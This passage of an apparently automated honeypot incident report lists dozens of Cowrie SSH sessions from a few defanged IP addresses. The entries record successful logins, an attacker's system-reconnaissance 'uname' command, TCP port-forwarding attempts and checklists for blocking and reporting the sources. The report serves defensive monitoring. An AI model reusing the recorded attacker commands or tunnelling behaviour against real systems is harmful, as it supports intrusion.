| `2026-09-01 17:01:51` | `cowrie.direct-tcpip.request` |
| `2026-09-01 17:01:52` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 17:01:52` | `cowrie.direct-tcpip.data` |
| `2026-09-01 17:01:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7c69a5766cc

| Field | Detail |
|---|---|
| **Source IP** | `159.223.123[.]239` |
| **First Seen** | 2026-09-01 17:05 |
| **Last Seen** | 2026-09-01 17:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:05:19` | `cowrie.session.connect` |
| `2026-09-01 17:05:19` | `cowrie.client.version` |
| `2026-09-01 17:05:19` | `cowrie.client.kex` |
| `2026-09-01 17:05:19` | `cowrie.login.success` |
| `2026-09-01 17:05:20` | `cowrie.session.params` |
| `2026-09-01 17:05:20` | `cowrie.command.input` |
| `2026-09-01 17:05:20` | `cowrie.log.closed` |
| `2026-09-01 17:05:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.123[.]239` to AbuseIPDB if not already reported
- [ ] Block `159.223.123[.]239` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55bd3211f412

| Field | Detail |
|---|---|
| **Source IP** | `159.223.123[.]239` |
| **First Seen** | 2026-09-01 17:07 |
| **Last Seen** | 2026-09-01 17:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:07:45` | `cowrie.session.connect` |
| `2026-09-01 17:07:45` | `cowrie.client.version` |
| `2026-09-01 17:07:45` | `cowrie.client.kex` |
| `2026-09-01 17:07:45` | `cowrie.login.success` |
| `2026-09-01 17:07:45` | `cowrie.session.params` |
| `2026-09-01 17:07:45` | `cowrie.command.input` |
| `2026-09-01 17:07:46` | `cowrie.log.closed` |
| `2026-09-01 17:07:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.123[.]239` to AbuseIPDB if not already reported
- [ ] Block `159.223.123[.]239` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6231978d977e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 17:08 |
| **Last Seen** | 2026-09-01 17:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:08:35` | `cowrie.session.connect` |
| `2026-09-01 17:08:35` | `cowrie.client.version` |
| `2026-09-01 17:08:35` | `cowrie.client.kex` |
| `2026-09-01 17:08:36` | `cowrie.login.success` |
| `2026-09-01 17:08:36` | `cowrie.direct-tcpip.request` |
| `2026-09-01 17:08:36` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 17:08:36` | `cowrie.direct-tcpip.data` |
| `2026-09-01 17:08:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbb73d298de9

| Field | Detail |
|---|---|
| **Source IP** | `159.223.123[.]239` |
| **First Seen** | 2026-09-01 17:10 |
| **Last Seen** | 2026-09-01 17:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:10:12` | `cowrie.session.connect` |
| `2026-09-01 17:10:12` | `cowrie.client.version` |
| `2026-09-01 17:10:12` | `cowrie.client.kex` |
| `2026-09-01 17:10:12` | `cowrie.login.success` |
| `2026-09-01 17:10:13` | `cowrie.session.params` |
| `2026-09-01 17:10:13` | `cowrie.command.input` |
| `2026-09-01 17:10:13` | `cowrie.log.closed` |
| `2026-09-01 17:10:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.123[.]239` to AbuseIPDB if not already reported
- [ ] Block `159.223.123[.]239` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a88f343531a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 17:11 |
| **Last Seen** | 2026-09-01 17:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:11:15` | `cowrie.session.connect` |
| `2026-09-01 17:11:15` | `cowrie.client.version` |
| `2026-09-01 17:11:15` | `cowrie.client.kex` |
| `2026-09-01 17:11:16` | `cowrie.login.success` |
| `2026-09-01 17:11:16` | `cowrie.direct-tcpip.request` |
| `2026-09-01 17:11:16` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 17:11:16` | `cowrie.direct-tcpip.data` |
| `2026-09-01 17:11:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c71c0b75da3

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 17:19 |
| **Last Seen** | 2026-09-01 17:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:19:26` | `cowrie.session.connect` |
| `2026-09-01 17:19:26` | `cowrie.client.version` |
| `2026-09-01 17:19:26` | `cowrie.client.kex` |
| `2026-09-01 17:19:27` | `cowrie.login.success` |
| `2026-09-01 17:19:28` | `cowrie.direct-tcpip.request` |
| `2026-09-01 17:19:28` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 17:19:28` | `cowrie.direct-tcpip.data` |
| `2026-09-01 17:19:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2ad242bab87

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 17:20 |
| **Last Seen** | 2026-09-01 17:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:20:46` | `cowrie.session.connect` |
| `2026-09-01 17:20:46` | `cowrie.client.version` |
| `2026-09-01 17:20:46` | `cowrie.client.kex` |
| `2026-09-01 17:20:47` | `cowrie.login.success` |
| `2026-09-01 17:20:47` | `cowrie.direct-tcpip.request` |
| `2026-09-01 17:20:47` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 17:20:47` | `cowrie.direct-tcpip.data` |
| `2026-09-01 17:20:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc7501869532

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:21 |
| **Last Seen** | 2026-09-01 17:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:21:38` | `cowrie.session.connect` |
| `2026-09-01 17:21:39` | `cowrie.client.version` |
| `2026-09-01 17:21:39` | `cowrie.client.kex` |
| `2026-09-01 17:21:39` | `cowrie.login.success` |
| `2026-09-01 17:21:40` | `cowrie.session.params` |
| `2026-09-01 17:21:40` | `cowrie.command.input` |
| `2026-09-01 17:21:40` | `cowrie.log.closed` |
| `2026-09-01 17:21:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd7b11533043

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:22 |
| **Last Seen** | 2026-09-01 17:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:22:03` | `cowrie.session.connect` |
| `2026-09-01 17:22:03` | `cowrie.client.version` |
| `2026-09-01 17:22:03` | `cowrie.client.kex` |
| `2026-09-01 17:22:03` | `cowrie.login.success` |
| `2026-09-01 17:22:04` | `cowrie.session.params` |
| `2026-09-01 17:22:04` | `cowrie.command.input` |
| `2026-09-01 17:22:04` | `cowrie.log.closed` |
| `2026-09-01 17:22:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db5d476f2eb9

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:22 |
| **Last Seen** | 2026-09-01 17:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:22:26` | `cowrie.session.connect` |
| `2026-09-01 17:22:26` | `cowrie.client.version` |
| `2026-09-01 17:22:26` | `cowrie.client.kex` |
| `2026-09-01 17:22:26` | `cowrie.login.success` |
| `2026-09-01 17:22:27` | `cowrie.session.params` |
| `2026-09-01 17:22:27` | `cowrie.command.input` |
| `2026-09-01 17:22:27` | `cowrie.log.closed` |
| `2026-09-01 17:22:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00f16711ac13

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:22 |
| **Last Seen** | 2026-09-01 17:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:22:47` | `cowrie.session.connect` |
| `2026-09-01 17:22:47` | `cowrie.client.version` |
| `2026-09-01 17:22:47` | `cowrie.client.kex` |
| `2026-09-01 17:22:48` | `cowrie.login.success` |
| `2026-09-01 17:22:48` | `cowrie.session.params` |
| `2026-09-01 17:22:48` | `cowrie.command.input` |
| `2026-09-01 17:22:48` | `cowrie.log.closed` |
| `2026-09-01 17:22:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e6db0115aa1

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:23 |
| **Last Seen** | 2026-09-01 17:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:23:08` | `cowrie.session.connect` |
| `2026-09-01 17:23:08` | `cowrie.client.version` |
| `2026-09-01 17:23:08` | `cowrie.client.kex` |
| `2026-09-01 17:23:08` | `cowrie.login.success` |
| `2026-09-01 17:23:09` | `cowrie.session.params` |
| `2026-09-01 17:23:09` | `cowrie.command.input` |
| `2026-09-01 17:23:09` | `cowrie.log.closed` |
| `2026-09-01 17:23:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50f447d44fc9

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:23 |
| **Last Seen** | 2026-09-01 17:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:23:28` | `cowrie.session.connect` |
| `2026-09-01 17:23:28` | `cowrie.client.version` |
| `2026-09-01 17:23:28` | `cowrie.client.kex` |
| `2026-09-01 17:23:29` | `cowrie.login.success` |
| `2026-09-01 17:23:29` | `cowrie.session.params` |
| `2026-09-01 17:23:29` | `cowrie.command.input` |
| `2026-09-01 17:23:29` | `cowrie.log.closed` |
| `2026-09-01 17:23:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd262769d645

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:23 |
| **Last Seen** | 2026-09-01 17:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:23:49` | `cowrie.session.connect` |
| `2026-09-01 17:23:49` | `cowrie.client.version` |
| `2026-09-01 17:23:49` | `cowrie.client.kex` |
| `2026-09-01 17:23:49` | `cowrie.login.success` |
| `2026-09-01 17:23:50` | `cowrie.session.params` |
| `2026-09-01 17:23:50` | `cowrie.command.input` |
| `2026-09-01 17:23:50` | `cowrie.log.closed` |
| `2026-09-01 17:23:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7a6c8dcd454

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:24 |
| **Last Seen** | 2026-09-01 17:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:24:10` | `cowrie.session.connect` |
| `2026-09-01 17:24:10` | `cowrie.client.version` |
| `2026-09-01 17:24:10` | `cowrie.client.kex` |
| `2026-09-01 17:24:10` | `cowrie.login.success` |
| `2026-09-01 17:24:11` | `cowrie.session.params` |
| `2026-09-01 17:24:11` | `cowrie.command.input` |
| `2026-09-01 17:24:11` | `cowrie.log.closed` |
| `2026-09-01 17:24:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb5148adaf5a

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:24 |
| **Last Seen** | 2026-09-01 17:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:24:30` | `cowrie.session.connect` |
| `2026-09-01 17:24:30` | `cowrie.client.version` |
| `2026-09-01 17:24:30` | `cowrie.client.kex` |
| `2026-09-01 17:24:31` | `cowrie.login.success` |
| `2026-09-01 17:24:31` | `cowrie.session.params` |
| `2026-09-01 17:24:31` | `cowrie.command.input` |
| `2026-09-01 17:24:31` | `cowrie.log.closed` |
| `2026-09-01 17:24:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adf9b76750d8

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:24 |
| **Last Seen** | 2026-09-01 17:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:24:51` | `cowrie.session.connect` |
| `2026-09-01 17:24:51` | `cowrie.client.version` |
| `2026-09-01 17:24:51` | `cowrie.client.kex` |
| `2026-09-01 17:24:51` | `cowrie.login.success` |
| `2026-09-01 17:24:52` | `cowrie.session.params` |
| `2026-09-01 17:24:52` | `cowrie.command.input` |
| `2026-09-01 17:24:52` | `cowrie.log.closed` |
| `2026-09-01 17:24:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f71fd763ab1

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:25 |
| **Last Seen** | 2026-09-01 17:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:25:11` | `cowrie.session.connect` |
| `2026-09-01 17:25:11` | `cowrie.client.version` |
| `2026-09-01 17:25:11` | `cowrie.client.kex` |
| `2026-09-01 17:25:11` | `cowrie.login.success` |
| `2026-09-01 17:25:12` | `cowrie.session.params` |
| `2026-09-01 17:25:12` | `cowrie.command.input` |
| `2026-09-01 17:25:12` | `cowrie.log.closed` |
| `2026-09-01 17:25:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b37d9f1595b

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:25 |
| **Last Seen** | 2026-09-01 17:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:25:31` | `cowrie.session.connect` |
| `2026-09-01 17:25:31` | `cowrie.client.version` |
| `2026-09-01 17:25:31` | `cowrie.client.kex` |
| `2026-09-01 17:25:31` | `cowrie.login.success` |
| `2026-09-01 17:25:32` | `cowrie.session.params` |
| `2026-09-01 17:25:32` | `cowrie.command.input` |
| `2026-09-01 17:25:32` | `cowrie.log.closed` |
| `2026-09-01 17:25:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09a1f856c60e

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:25 |
| **Last Seen** | 2026-09-01 17:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:25:51` | `cowrie.session.connect` |
| `2026-09-01 17:25:51` | `cowrie.client.version` |
| `2026-09-01 17:25:51` | `cowrie.client.kex` |
| `2026-09-01 17:25:51` | `cowrie.login.success` |
| `2026-09-01 17:25:52` | `cowrie.session.params` |
| `2026-09-01 17:25:52` | `cowrie.command.input` |
| `2026-09-01 17:25:52` | `cowrie.log.closed` |
| `2026-09-01 17:25:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e322d3ead894

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:26 |
| **Last Seen** | 2026-09-01 17:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:26:10` | `cowrie.session.connect` |
| `2026-09-01 17:26:10` | `cowrie.client.version` |
| `2026-09-01 17:26:10` | `cowrie.client.kex` |
| `2026-09-01 17:26:11` | `cowrie.login.success` |
| `2026-09-01 17:26:12` | `cowrie.session.params` |
| `2026-09-01 17:26:12` | `cowrie.command.input` |
| `2026-09-01 17:26:12` | `cowrie.log.closed` |
| `2026-09-01 17:26:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82e2d42743f3

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:26 |
| **Last Seen** | 2026-09-01 17:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:26:30` | `cowrie.session.connect` |
| `2026-09-01 17:26:30` | `cowrie.client.version` |
| `2026-09-01 17:26:30` | `cowrie.client.kex` |
| `2026-09-01 17:26:30` | `cowrie.login.success` |
| `2026-09-01 17:26:31` | `cowrie.session.params` |
| `2026-09-01 17:26:31` | `cowrie.command.input` |
| `2026-09-01 17:26:31` | `cowrie.log.closed` |
| `2026-09-01 17:26:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebf4ba9ac249

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:26 |
| **Last Seen** | 2026-09-01 17:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:26:50` | `cowrie.session.connect` |
| `2026-09-01 17:26:50` | `cowrie.client.version` |
| `2026-09-01 17:26:50` | `cowrie.client.kex` |
| `2026-09-01 17:26:50` | `cowrie.login.success` |
| `2026-09-01 17:26:51` | `cowrie.session.params` |
| `2026-09-01 17:26:51` | `cowrie.command.input` |
| `2026-09-01 17:26:51` | `cowrie.log.closed` |
| `2026-09-01 17:26:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3ebb5f23842

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:27 |
| **Last Seen** | 2026-09-01 17:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:27:10` | `cowrie.session.connect` |
| `2026-09-01 17:27:10` | `cowrie.client.version` |
| `2026-09-01 17:27:11` | `cowrie.client.kex` |
| `2026-09-01 17:27:11` | `cowrie.login.success` |
| `2026-09-01 17:27:12` | `cowrie.session.params` |
| `2026-09-01 17:27:12` | `cowrie.command.input` |
| `2026-09-01 17:27:12` | `cowrie.log.closed` |
| `2026-09-01 17:27:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.63[.]15` to AbuseIPDB if not already reported
- [ ] Block `138.68.63[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdb80343e6c9

| Field | Detail |
|---|---|
| **Source IP** | `138.68.63[.]15` |
| **First Seen** | 2026-09-01 17:27 |
| **Last Seen** | 2026-09-01 17:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 17:27:31` | `cowrie.session.connect` |
